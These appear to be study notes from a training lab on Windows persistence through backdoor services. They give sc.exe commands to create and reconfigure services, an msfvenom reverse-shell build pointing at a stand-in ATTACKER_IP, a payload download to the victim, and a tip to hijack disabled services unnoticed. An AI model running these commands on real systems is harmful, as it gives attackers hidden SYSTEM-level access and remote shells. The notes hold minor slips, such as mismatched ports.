- services are executable that runs in background.
- Creating backdoor services: 
    - to create a new service : 
        sc.exe create THMservice binPath= "net user Administrator Passwd123" start= auto
        sc.exe start THMservice
        - There must be a space after each equal sign
    - to create a backdoor service : 
        - create a payload with msfvenom : 
            msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4448 -f exe-service -o rev-svc.exe
        - upload the payload to the victim
            - attacker : 
                python -m http.server 4444
            - victim : 
                wget http://ATTACKER_IP:444/rev-svc.exe -outfile "rev-svc"
        - create a new service : 
            - sc.exe create THMservice2 binPath= "C:\windows\rev-svc.exe" start= auto
            - sc.exe start THMservice2

- Modifying existing services:
    - get all services : 
        sc.exe query state=all
    - Any disabled service will be a good candidate, as these could be altered without user noticing it.
    - Get the desired service :
        sc.exe qc THMService3
    - three things are needed to care about when using " 
        - BINARY_PATH_NAME : should point to the payload
        - START_TYPE : should be automatic so that it runs without user interaction
        - SERVICE_START_NAME : should be LocalSystem to gain SYSTEM privileges.
    - configure the service : 
        sc.exe config THMservice3 binPath= "C:\Windows\rev-svc2.exe" start= auto obj= "LocalSystem"
    - query it again to check if all went as expected : 
        sc.exe qc THMService3
    - run listner on the attacker
        - multi handler for a metasploit payload
    - start the service 
        sc.exe start THMService3
